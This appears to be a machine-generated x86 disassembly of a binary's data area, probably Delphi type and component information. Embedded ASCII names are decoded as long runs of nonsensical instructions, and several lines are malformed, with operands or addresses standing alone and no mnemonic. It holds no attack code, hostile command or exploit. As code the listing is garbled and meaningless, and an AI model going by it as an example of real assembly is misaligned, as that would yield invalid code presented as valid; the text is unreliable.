insd
jo r-xdata
je r-xdata
outsb
add [ 0x6f43 ] ecx
insd
jo r-xdata
js r-xdata
outsb
je r-xdata
js r-xdata
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] al
outsd
dec ecx
outsb
jae r-xdata
outsb
outsb
je r-xdata
or [ eax + 0x430e0042 ] ah
outsd
insd
jo r-xdata
add [ eax ] al
add [ eax - 0x4f ] bh
outsb
je r-xdata
insb
popad
jae r-xdata
or [ ebx + 0x6c ] eax
push 0x614e646f
inc edx
add [ esi ] al
push edx
popad
jb r-xdata
popad
popad
outsb
arpl [ ebp + 0x45 ] sp
add [ esi ] al
push edx
popad
jb r-xdata
outsb
outsb
popad
je r-xdata
or [ 0x65724354 ] dl
outsb
outsb
je r-xdata
jb r-xdata
add ecx [ eax ]
push es
push edx
popad
insb
popad
jae r-xdata
push 0x501646f
inc ebp
jb r-xdata
outsb
outsb
je r-xdata
inc eax
adc al [ eax ]
or cl [ ebp + 0x65 ]
je r-xdata
add [ eax ] al
add al 0x8
push es
push edx
popad
jb r-xdata
inc eax
add [ 0x6f727245 ] al
jb r-xdata
insd
jo r-xdata
popad
jae r-xdata
insb
insb
popad
jae r-xdata
je r-xdata
or [ ecx ] ecx
inc ebx
outsd
insd
jo r-xdata
inc ebx
outsd
push edx
popad
jb r-xdata
insb
popad
jae r-xdata
or [ ecx + 0x6e ] cl
outsd
dec esi
popad
insd
add cl [ edx ]
dec ebp
push esp
outsd
insd
jo r-xdata
inc eax
add ah al
movsd [ edi ] [ esi ]
inc edx
add [ eax ] cl
sbb edx [ esi + eax * 2 + 0x69 ]
outsb
inc ebx
add [ ebp - 0x5a3bffc0 ] cl
je r-xdata
outsb
adc [ bx ] eax
inc ecx
dec ebp
je r-xdata
outsd
andps xmm0 [ ebx + 0x6f ]
insd
jo r-xdata
add al 0x4e
popad
insd
add al [ gs : eax ]
outsb
outsb
je r-xdata
add [ eax - 0x4f ] bh
inc edx
inc edx
outsd
je r-xdata
or cl [ ebp + 0x65 ]
je r-xdata
outsd
insb
popad
outsb
add al [ eax ]
add [ eax ] ebx
inc edx
add [ eax + eax - 0x63c00000 ] dl
popad
outsb
arpl [ ebp + 0x7 ] sp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x78007265
mov cl 0x42
add [ eax + 0x12 ] al
inc eax
add ah ah
adc [ eax ] al
add [ gs : eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax - 0x4f ] bh
jb r-xdata
outsd
add al [ fs : eax ]
add [ eax ] eax
add al [ gs : eax ]
add [ eax ] eax
adc al 0x40
add [ edi ] al
inc ecx
dec ebp
je r-xdata
insd
push es
jae r-xdata
outsd
dec esi
popad
adc [ eax ] al
add eax 0x6f727245
outsd
pop es
push esp
dec ebp
je r-xdata
je r-xdata
outsb
outsb
outsb
je r-xdata
inc ebx
add [ eax + 0x59 ] dh
inc ebx
add [ eax - 0x77ffbc7d ] ah
add [ ebx ] 0x7c
push 0x43
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x12 ] al
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
sbb ch dl
inc edx
add [ eax ] ch
add [ eax ] al
add [ esi ] al
inc esi
dec edi
ja r-xdata
rol [ edx + 0x59000043 ] 0x1
inc edx
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add al al
push esi
inc ebx
add [ eax + 0x4d ] ah
inc ebx
add [ eax - 0x3bffbca9 ] cl
push edi
inc ebx
add ah al
pop ebx
inc ebx
add ah bl
pop eax
inc ebx
add al dl
add [ ebx ] 0x0
pop ecx
popad
outsb
arpl [ ebp + 0x2 ] sp
add [ ebx + 0x42a6b0c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
cmpsb [ esi ] [ edi ]
inc edx
add [ ebp ] ah
add [ eax ] al
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
js r-xdata
outsb
jae r-xdata
outsb
jae r-xdata
jb r-xdata
inc eax
adc al [ eax ]
add [ eax ] al
jb r-xdata
outsd
add [ fs : 0x6f727245 ] eax
je r-xdata
inc edx
add [ esi ] al
push edx
popad
jb r-xdata
jae r-xdata
dec ecx
outsb
popad
outsb
arpl [ ebp + 0x45 ] sp
jbe r-xdata
adc eax 0x466e4f46
imul ebp [ esi + 0x64 ] 0x706d6f43
outsd
outsb
outsb
je r-xdata
popad
outsb
arpl [ ebp + 0x2 ] sp
add [ eax ] al
sbb ch dl
inc edx
add [ eax + eax ] ch
add [ eax ] al
pop es
inc esi
push eax
popad
jb r-xdata
add [ eax ] al
add ecx [ eax ]
push es
push edx
popad
jb r-xdata
add esp esp
adc [ eax ] al
or [ ecx + 0x6e ] cl
add al [ eax ]
outsb
outsb
arpl [ ebp + 0x2 ] sp
add [ eax ] al
inc eax
adc al [ eax ]
add [ eax ] 0x0
add [ ecx ] cl
inc esi
insb
popad
jae r-xdata
jb r-xdata
popad
insd
add al [ gs : eax ]
add [ ecx + 0x42 ] ch
add [ eax ] dl
add [ eax ] al
adc [ esi + 0x4f ] al
outsb
push edx
jb r-xdata
fsub [ eax + r-xdata ]
add [ eax ] al
or al [ esi + 0x4f ]
outsb
push ebx
je r-xdata
outsb
je r-xdata
add al [ esi + ecx * 2 ]
push esp
push edx
popad
jb r-xdata
inc edx
add ah dh
dec [ ebx + 0x420042ab ]
add ah dh
jo r-xdata
add [ eax ] al
adc [ esi + 0x43 ] eax
add al [ eax ]
add [ esp + 0x42 ] cl
add [ eax ] dh
add [ eax ] al
adc al [ esi + 0x4f ]
push eax
jb r-xdata
outsd
jb r-xdata
outsb
inc ebx
jb r-xdata
add [ edx ] dl
inc esi
outsb
arpl [ ebp + 0x4e ] sp
popad
insd
add al [ gs : eax ]
add ah dl
mov eax [ 0x580042 ]
add [ eax ] al
adc eax [ esi + 0x4f ]
outsb
inc ecx
outsb
arpl [ ebp + 0x73 ] sp
je r-xdata
fcomp [ edx + 0x42 ]
add [ eax ] dh
add [ eax ] al
add [ edi ] al
inc esi
inc esi
imul edi [ eax + 0x75 ] 0x27370
add ah bl
pop edx
inc edx
add [ eax + eax ] dh
add [ eax ] al
pop es
inc esi
dec esp
outsd
popad
add al [ fs : eax ]
add [ eax ] ah
inc edx
add [ eax ] bh
add [ eax ] al
add [ 0x466e4f46 ] cl
imul ebp [ esi + 0x64 ] 0x6874654d
outsd
add al [ fs : eax ]
add [ eax ] al
movsd [ edi ] [ esi ]
inc edx
add [ eax ] al
add [ eax ] al
adc eax 0x466e4f46
imul ebp [ esi + 0x64 ] 0x6874654d
outsd
dec ecx
add [ eax ] al
mov [ eax + 0x42 ] ch
add [ eax ] al
mov ah 0xa9
jb r-xdata
popad
insd
push es
jae r-xdata
add al 0x4e
add ah dh
dec [ ebx - 0x56 ]
popad
insd
add al [ gs : eax ]
add [ eax ] al
0x840042 0x0
pop es
inc esi
inc esi
imul ebp [ esi + 0x64 ] 0x27265
add [ eax ] al
adc [ eax ] al
mov [ eax ] al
lodsb [ esi ]
inc edx
add [ edx ] al
hlt
jo r-xdata
popad
outsb
inc ebx
popad
je r-xdata
cwde
mov [ 0x680042 ] eax
add [ eax ] al
add [ eax ] al
inc ebx
outsd
insd
jo r-xdata
jb r-xdata
add [ ecx + esi * 4 + 0x42 ] bh
add dh ch
cmpsb [ esi ] [ edi ]
inc edx
add [ eax + 0x42a8 ] cl
add [ eax ] al
add [ ecx + ebp * 4 + 0x940042 ] dh
add [ eax ] al
inc eax
pushfd
jae r-xdata
outsb
add [ bx + si ] ecx
dec ecx
outsb
add ah dh
dec ebp
lodsb [ esi ]
inc edx
add [ edx ] al
hlt
jae r-xdata
dec eax
popad
outsb
insb
inc ebp
js r-xdata
inc ebx
outsd
insd
jo r-xdata
inc edx
add [ edx ] cl
add [ eax ] eax
mov ebp 0x4a0042aa
dec ebx
stosb [ edi ]
outsb
outsb
outsd
je r-xdata
add [ 0x42a9bc00 ] ah
add [ eax ] al
add [ ebp ] cl
add [ eax ] al
and eax 0x42a9bc00
outsb
outsb
je r-xdata
jo r-xdata
outsb
jae r-xdata
dec edi
outsd
jne r-xdata
shl [ ebp + 0x780042 ] 0x0
add [ eax ] bl
inc esi
dec edi
outsb
inc esi
imul ebp [ esi + 0x64 ] 0x706d6f43
outsd
add [ eax ] al
add [ edx ] al
add [ 0x420042ab ] dh
add ah dh
[ esi - 0x55 ]
inc edx
add [ edx ] al
hlt
popad
je r-xdata
outsb
add al [ fs : eax ]
add [ ebx ] cl
inc edx
add [ eax ] ah
add [ eax ] al
or [ esi + 0x4f ] al
outsb
inc ebp
sub_42b564
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl [ ebp - 0x41a3ffbe ] 0x1
inc edx
add dl ah
mov ch 0x42
add [ esi + esi * 4 + 0x42 ] dh
add [ eax ] al
cwde
mov bh 0x42
add [ eax + eax ] bl
add [ eax - 0x64 ] al
inc edx
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ eax + ecx * 4 + 0x43 ] ch
add [ ecx + ecx * 4 - 0x775bffbd ] dl
inc ebx
add ah cl
mov [ ebx ] al
push eax
mov [ ebx ] eax
nop
lea eax [ ebx ]
or [ ecx + 0xe0043 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
inc eax
adc al [ eax ]
sub al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] bl
aad 0x42
add [ eax ] ch
add [ eax ] al
add [ 0x6f6f5246 ] cl
je r-xdata
inc esi
outsb
arpl [ ebp + 0x73 ] sp
je r-xdata
add al [ eax ]
add [ eax ] al
sbb al 0x0
jb r-xdata
inc ecx
outsb
arpl [ ebp + 0x73 ] sp
je r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] dl
inc eax
add [ eax ] dl
outsd
jae r-xdata
add ah dh
[ eax - 0x47 ]
inc edx
add [ edx ] al
jb r-xdata
inc eax
adc al [ eax ]
sub al 0x0
add [ eax ] al
or [ esi + 0x50 ] eax
jb r-xdata
add [ eax ] al
mov edx r-xdata
hlt
push ecx
jne r-xdata
pushfd
adc [ eax ] al
cmp [ eax ] al
add [ eax ] al
or [ esi + 0x43 ] eax
push 0x50646c69
outsd
jae r-xdata
add [ eax ] al
jae r-xdata
les esi [ edx + eax * 2 + 0x4800 ]
add [ eax ] al
outsb
inc esi
imul ebp [ esi + 0x64 ] 0x6874654d
outsd
dec esi
popad
insd
add al [ gs : eax ]
add [ eax ] al
adc [ eax ] al
push eax
add [ eax ] al
add [ edx ] dl
inc esi
push ebp
add [ eax ] al
adc [ esi + 0x4f ] eax
jo r-xdata
dec ebx
insb
imul esp [ esi + 0x69 ] 0x614e6465
insd
jae r-xdata
fdiv [ ebx + r--data ]
add [ eax ] al
cmovbe ecx [ edi + 0x6e ]
add [ eax ] al
inc esi
imul ebp [ esi + 0x64 ] 0x65636e41
jae r-xdata
inc eax
add [ eax ] al
add [ edi ] cl
inc esi
dec edi
outsb
popad
je r-xdata
mov al [ 0x4d0042b7 ]
add bh bh
inc edi
mov bh 0x42
add [ edx ] cl
add [ eax ] eax
cmp [ eax + r-xdata ] edi
add al [ eax ]
mov cl 0xb8
inc edx
add [ edx ] cl
add eax [ eax ]
fdivr [ eax + r-xdata ]
hlt
add [ eax + eax ] bl
add [ eax ] al
hlt
mov ecx r-xdata
outsd
add [ ecx ] dl
inc esi
dec edi
dec eax
add [ eax ] al
add al [ eax ]
add ah bl
pop edx
inc edx
add [ eax ] dh
add [ eax ] al
add [ 0x636e4146 ] cl
jae r-xdata
add [ eax ] al
adc al [ esi + 0x55 ]
outsd
jb r-xdata
inc ecx
outsb
arpl [ ebp + 0x73 ] sp
je r-xdata
imul esi [ ebx + 0x74 ] 0x9c000002
adc [ eax ] al
xor al 0x0
add [ eax ] al
or al 0x46
sub_42bf70
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fdivr [ edi + 0x42 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_42c96c
mov al 0xc9
inc edx
add al ah
leave
inc edx
add [ eax ] al
add [ eax ] al
add ah bh
leave
inc edx
add [ eax ] dl
add [ eax ] al
add [ esp + edx ] bh
inc eax
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add al ah
push ebp
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
pushfd
adc [ eax ] al
add al 0x0
add [ eax ] al
push es
inc esi
dec ecx
outsb
js r-xdata
sbb ch dl
inc edx
add [ eax ] cl
add [ eax ] al
add [ edx ] cl
inc esi
inc ebx
outsd
insd
jo r-xdata
add [ eax ] al
add al [ eax ]
sub al [ eax ]
and al 0xc1
inc ebx
add [ edx ] cl
inc edi
je r-xdata
outsb
outsb
je r-xdata
add al [ eax ]
jne r-xdata
add [ ebx ] al
add [ ecx ] dl
0x42
add [ eax ] al
jae r-xdata
jb r-xdata
add [ ecx ] al
add [ edx ] al
fxch st2
inc edx
add [ edx ] al
add [ edx ] al
add [ eax ] bl
aad 0x42
add [ ecx + eax * 8 ] ah
inc ebx
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307ffff ] al
jne r-xdata
sbb al 0x40
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
outsb
je r-xdata
imul ebp [ esi + 0x67 ] 0x4473630c
jb r-xdata
add edi [ edx ]
xor al 0x35
add [ eax ] eax
add [ eax ] al
add [ edx ] cl
add [ eax ] al
add [ eax ] bh

inc edx
add [ eax ] cl
add [ ecx ] al
add [ eax + 0x42ca ] ah
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
sub [ eax ] al
xor cl al
inc ebx
add [ eax ] cl
dec ebp
outsd
jbe r-xdata
add [ eax ] bl
aad 0x42
outsd
jb r-xdata
imul ebp [ fs : esi + 0x67 ] 0x57736309
jb r-xdata
outsb
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec esi
js r-xdata
jb r-xdata
je r-xdata
outsd
jns r-xdata
pop es
je r-xdata
add al [ eax ]
lea eax [ eax ]
movsb [ edi ] [ esi ]
0x42
add [ eax ] eax
mov al [ 0x42ca ]
add bl cl
inc edx
add [ ebx ] al
or dl [ edi + ecx * 2 + 0x70 ]
jb r-xdata
je r-xdata
outsb
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add eax [ eax ]
add [ eax ] dl
inc eax
add [ eax ] cl
add [ ecx ] al
add [ eax + 0x42ca ] ah
add [ eax ] al
add [ eax ] al
outsb
jae r-xdata
add al [ eax ]
mov eax eax
pop eax
int3
je r-xdata
add [ esi ] al
andps xmm0 [ ebx + 0x6f ]
insd
jo r-xdata
outsb
insd
jo r-xdata
push es
outsb
or esp [ bp + di + 0x73 ]
inc esp
jae r-xdata
insb
popad
jae r-xdata
jae r-xdata
insb
popad
jae r-xdata
outsb
or al 0x63
jae r-xdata
je r-xdata
add [ esp + 0x4 ] 0xffffffd0
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
outsb
outsb
je r-xdata
add al [ fs : eax ]
mov eax eax
add eax 0x6c696843
outsb
je r-xdata
inc edx
add edi [ eax ]

rcl ah 0xcc
outsb
outsb
je r-xdata
outsb
je r-xdata
outsb
imul ebp [ esi + 0x67 ] 0x4173630a
outsb
arpl [ ebp + 0x73 ] sp
je r-xdata
insd
jo r-xdata
jae r-xdata
loopne r-xdata
add [ eax + r-xdata ] dl
imul ebp [ edi + 0x6e ] 0x49736308
jae r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah bh
0x42
inc esp
and al 0x4
inc edx
add [ edi ] cl
cmovns eax [ ebp + 0x73 ]
imul esp [ edi + 0x6e ] 0x6f4e7265
popad
insd
add al [ gs : eax ]
mov eax eax
aam 0xcc
inc ebx
inc esp
and al 0x4
shr cl 0x1
sub eax [ eax ]
add [ eax ] eax
int3
jns r-xdata
mov esp 0x120042cc
push cs
push esp
inc ebx
outsd
je r-xdata
cmp dh [ 0x135 ]
jb r-xdata
rcr [ eax - 0x34 ] 0x42
add [ ebx + 0x42cc58c0 ] cl
dec esi
andps xmm0 [ ebx + 0x6f ]
inc edx
add [ esi ] al
push ebx
jne r-xdata
outsb
dec ecx
outsb
jae r-xdata
mov eax [ eax ]
jmp [ eax + 0x28 ]
rcl ah 0xe9
pop [ eax ]
add [ eax ] eax
add [ esp + 0x4 ] 0xffffffd4
mov eax [ esp + 0x4 ]
sbb al 0x40
add [ ecx ] al
pop es
call 0xffffffffe3e98661
rcl [ ecx ] 0x1
stosb [ edi ]
mov cl 0x0
ror [ edi - 0x4f ] 0x6f
mov esp 0x616c4307
jae r-xdata
je r-xdata
outsd
insb
add eax edi
or [ ebx + 0x73 ] ah
arpl [ ebx + 0x55 ] si
jo r-xdata
popad
bound ebp [ ebp + 0x10 ]
arpl [ ebx + 0x43 ] si
push 0x506b6365
jb r-xdata
outsb
insb
imul ebp [ esi + 0x65 ] 0x44736310
jae r-xdata
imul sp [ ebx + 0x61 ] 0x6974
outsd
outsb
or [ ebx + 0x73 ] ah
dec ecx
outsb
inc ebx
outsd
insd
jo r-xdata
popad
inc ebx
popad
outsb
arpl [ ebp + 0x7 ] sp
add [ edx ] al
add [ eax ] al
add [ eax + 0x18 ] bl
mov esp edx
xchg ah ch
pop ecx
inc ebp
jae r-xdata
popad
jb r-xdata
add [ eax ] al
add eax [ eax ]
add [ eax ] al
clc

inc edx
add [ ebx ] al
add edi [ edx ]
xor eax 0x135
popad
je r-xdata
je r-xdata
jo r-xdata
sbb ch dl
inc edx
add [ edx ] dh
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] bl
aad 0x42
add [ 0x6c696843 ] al
outsb
outsb
je r-xdata
inc [ edx ]
add ah cl
add eax 0xffffffd4
jmp sub_43cda0
add bh bh
arpl [ ebx + 0x49 ] si
outsb
push 0x74697265
outsd
je r-xdata
dec esi
add [ eax ] al
inc esi
imul edi [ eax + 0x75 ] 0x63127370
jae r-xdata
outsb
or [ bp + di + 0x73 ] ah

clc
jbe r-xdata
pop es
arpl [ ebx + 0x54 ] si
or dl [ ebx + eax * 2 + 0x6f ]
insd
jo r-xdata
imul ebp [ esi + ecx + 0x63 ] 0x62755373
add al [ eax ]
outsb
outsb
sub_42cfbf
push [ eax + 0x420042d3 ]
add ah dh
push edi
rol [ edx ] cl
dec edx
add al bh
call [ edx - 0x2c ]
inc edx
add [ edx ] cl
or al 0x0
mov ss sp
inc edx
add [ edx ] al
hlt
sub_42d3fb
inc ebx
add [ ecx ] dl
push ebx
popad
inc bx
popad
insb
insb
inc ebp
js r-xdata
add [ edx ] al
add [ eax ] bl
aad 0x42
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax - 0x24 ] dh
inc edx
jo r-xdata
add eax [ eax ]
add [ eax ] dl
inc eax
add [ eax ] cl
add [ ebx ] al
add [ eax ] bl
aad 0x42
insd
jo r-xdata
add [ ecx ] al
add [ esi ] al
imul ebp [ edi + 0x6e ] 0x129c0003
inc eax
add [ eax ] cl
add [ ebx ] al
add [ eax ] bl
aad 0x42
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax ] al
sbb al 0x40
add [ ecx ] al
add [ eax * 2 + 0x70656378 ] cl
je r-xdata
add [ edx ] al
add [ ecx ] cl
dec edi
jo r-xdata
insd
outsb
je r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add al [ eax ]
bound ebp [ edx + 0x65 ]
arpl [ edx + eax ] si
add ah ah
adc [ eax ] al
add al [ eax ]
or al [ ebp + 0x78 ]
arpl [ ebp + 0x70 ] sp
je r-xdata
add [ eax ] eax
add edx [ ecx + 0x67 ]
or al [ eax ]
jb r-xdata
je r-xdata
jb r-xdata
add al [ eax ]
cmp al [ eax ]
movsb [ edi ] [ esi ]
int 0x43
add [ edi ] cl
dec ecx
jae r-xdata
jb r-xdata
add [ eax ] al
add al bl
aad 0x42
add [ edx ] al
add [ edx ] al
out 0xd5 eax
inc edx
add [ edx ] al
add [ edx ] al
adc dh dl
inc edx
add [ edx ] al
add [ edx ] al
cmp esi edx
outsd
outsb
add al [ eax ]
add al [ eax ]
sbb al 0xd5
inc edx
add [ edi ] al
or dl [ ebx + eax * 2 + 0x6f ]
insd
jo r-xdata
insb
add al [ eax ]
add [ esp + ebx ] ah
inc eax
add [ ecx ] al
add [ ecx ] al
dec ecx
add al [ eax ]
add ah bh
0x42
push ebx
add ax [ eax ]
add [ eax ] dl
inc eax
add [ eax ] cl
add [ edx ] al
add [ eax ] bl
aad 0x42
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ esp + ebx ] ah
inc eax
add [ ecx ] al
add [ ecx ] al
dec ecx
add al [ eax ]
add al [ eax ]
push eax
add [ esi + ecx * 8 ] ah
inc ebx
add [ edx ] dl
push edx
jb r-xdata
add [ eax + eax ] bh
cld

add [ edx ] al
inc edx
add [ edx ] al
add [ edx ] al
outsb
outsb
je r-xdata
add al [ eax ]
mov eax 0x80042cc
outsb
arpl [ ebp + 0x49 ] sp
outsb
je r-xdata
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
into
inc edx
add [ eax + 0x2004260 ] bl
add [ eax ] al
[ eax ]
add [ eax ] al
inc [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040000 ] al
jb r-xdata
add [ edx ] al
rcl dh 0x1
inc edx
add [ edx ] al
add [ ebx ] al
cmp al 0xd5
inc edx
add [ edx ] al
add [ ebx ] al
pop ebx
aad 0x42
add [ edx ] al
add [ edx ] al
add [ esp + ebx ] ah
inc eax
add [ eax ] bh
int3
jae r-xdata
popad
insd
pushfd
adc [ eax ] al
or al 0x0
add bh bh
or al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ eax ] al
add dh bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
add al 0x4e
add [ eax ] al
add [ ebx + edx * 2 ] al
popad
arpl [ ebp + 0x3 ] sp
add [ eax ] al
adc [ eax ] al
or [ eax ] al
add eax [ eax ]
sbb ch dl
inc edx
int3
add [ eax + 0x80042cc ] bh
sub_42d599
salc
inc edx
add [ edx ] al
add [ edx ] al
mov edx esi
inc edx
add [ edx ] al
add [ edx ] al
mov al 0xd6
inc edx
add [ edx ] al
add [ edx ] al
rcl dh 0x1
inc edx
add [ edx ] al
add [ ebx ] al
cmp al 0xd5
inc edx
add [ edx ] al
add [ ebx ] al
pop ebx
aad 0x42
add [ edx ] al
add [ edx ] al
add [ esp + ebx ] ah
inc eax
add [ eax ] bh
int3
sub_42d7b3
push [ ebx ]
fadd [ edx ]
dec edx
add [ esi ] al
add [ esi - 0x28 ] ch
inc edx
add [ edx ] cl
pop es
add [ eax ] dl
push esp
inc edx
popad
jae r-xdata
cmp eax [ eax ]
pushad
iretd
arpl [ ecx + 0x63 ] ax
je r-xdata
add [ edi ] al
inc ebp
js r-xdata
outsd
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xcecc0037
inc ebx
add [ esi ] al
inc ebx
jb r-xdata
je r-xdata
arpl [ ebp + 0x74 ] si
add eax [ gs : eax ]
add [ eax ] dl
inc eax
add [ eax ] cl
add [ edx ] al
add [ eax + ebx * 8 + 0x42 ] dl
add al 0x53
insb
add al [ eax ]
add [ eax ] bl
aad 0x42
add [ ecx ] al
add [ edx ] cl
inc ecx
inc ebx
outsd
insd
jo r-xdata
adc [ eax ] al
popad
je r-xdata
outsb
outsd
outsb
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add [ eax ] al
dec [ eax + eax ]
add dh bh
outsb
outsb
je r-xdata
or [ eax ] al
add al [ eax ]
xchg esp eax
fadd [ edx ]
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al [ eax ]
xchg esp eax
fadd [ edx ]
add [ eax ] al
add al 0x53
insb
add al [ eax ]
add [ eax ] al
sbb al 0x40
add [ edx ] al
add [ edi ] al
inc ecx
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x2000274
add [ edi ] ah
add [ edi + ecx * 8 ] dl
inc ebx
add [ edi ] al
inc esp
jae r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08ffff ] al
inc edx
add [ eax + 0x300042d9 ] bh
fiadd [ edx ]
jl r-xdata
jae r-xdata
add [ esi ] ah
add [ edi + ecx * 8 + 0x55060043 ] dh
jo r-xdata
add [ edx ] al
add al 0x53
jb r-xdata
dec edi
inc edx
add [ edx + ebx * 8 + 0x5c0042 ] al
add [ eax ] al
mov al 0xcd
inc edx
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0xfffbfa8 ] bh
int3
add [ edx ] al
add [ edx ] al
rcr al 0x1
inc edx
add [ edx ] al
add [ edx ] al
int1
fadd [ edx ]
add al [ eax ]
add al [ eax ]
jo r-xdata
add [ eax ] eax
add [ eax ] al
popad
je r-xdata
inc ebx
push 0x65676e61
insb
fld [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
cmp bh 0xff
or [ edi + 0x6e ] cl
arpl [ ecx + 0x63 ] ax
insb
add al [ eax ]
add al [ eax ]
cwde
fadd [ edx ]
pop es
adc [ edx + eax * 2 + 0x61 ] dl
jae r-xdata
add [ eax ] al
add [ ebx + edx * 2 ] al
jns r-xdata
add [ eax + eax * 2 ] bl
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
inc edx
add [ eax ] dl
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add [ eax ] dl
inc eax
add [ eax ] cl
add [ ecx ] al
add [ eax + ebx * 8 + 0x42 ] dl
add [ eax ] al
or [ eax ] al
add [ eax ] eax
xchg esp eax
fadd [ edx ]
add [ eax ] al
add al 0x53
insb
add al [ eax ]
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ eax + ebx * 8 + 0x42 ] dl
sub_42d8e9
inc [ esi ]
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
aam 0x46
inc edx
add [ eax ] cl
add [ eax ] al
dec [ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08ffff ] al
inc edx
add [ eax + 0x300042d9 ] bh
fiadd [ edx ]
jl r-xdata
outsb
inc ebx
push 0x65676e61
insb
fld [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
dec edi
inc edx
add [ edx + ebx * 8 + 0x5c0042 ] al
add [ eax ] al
mov al 0xcd
inc edx
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0xfffbfa8 ] bh
int3
sub_42da85
push esp
inc edx
popad
jae r-xdata
add [ 0x646e6148 ] cl
insb
arpl [ ecx + 0x63 ] ax
je r-xdata
insb
popad
jb r-xdata
jae r-xdata
insb
outsd
outsb
add al al
iretd
add [ edx ] al
add [ esi ] bh
add [ eax - 0x2f ] cl
je r-xdata
cmp eax 0x43d07000
je r-xdata
add [ eax ] al
or [ eax ] al
add al [ eax ]
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ 0x63657845 ] cl
jne r-xdata
add [ 0x43d07000 ] bh
add [ edx ] al
add [ edx ] al
add [ eax - 0x24 ] dh
push esp
popad
jb r-xdata
inc eax
add [ eax ] cl
add [ edx ] al
add [ eax - 0x24 ] dh
add [ eax ] al
adc [ eax ] al
or [ eax ] al
add al [ eax ]
jo r-xdata
inc ebx
add [ edi ] cl
push edx
imul esi [ gs : bp + di + 0x74 ] 0x68437265
popad
outsb
jae r-xdata
add al [ eax ]
add [ eax - 0x2f ] cl
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + ebx * 8 + 0x10042 ] dl
add eax 0x756c6156
add al [ gs : eax ]
add [ eax ] al
or [ eax ] al
add al [ eax ]
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ edx ] al
add [ eax - 0x24 ] dh
jae r-xdata
je r-xdata
push ebx
je r-xdata
add al [ eax ]
add al [ eax ]
